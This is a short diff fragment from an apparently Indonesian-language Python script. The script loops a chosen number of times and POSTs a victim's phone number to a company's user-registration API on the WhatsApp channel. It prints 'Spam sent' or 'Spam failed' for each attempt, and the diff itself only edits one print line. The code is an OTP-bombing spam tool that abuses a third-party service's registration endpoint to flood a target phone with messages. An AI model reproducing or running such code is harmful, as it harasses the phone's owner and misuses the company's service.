@@ -72,7 +72,7 @@ for k in range(jumlah):
   data = json.dumps({"phone_number":"+62"+nomer,"channel":"WA"})
   pos = requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers=head,data=data).text
   if "success" in pos:
-    print("[ + ] Spam Berhasil di kirim ke :",nomor,k)
+    print("[ + ] Spam Berhasil di kirim ke :",k)
   else:
     print("[ X ] Spam Gagal Su ",k)
 
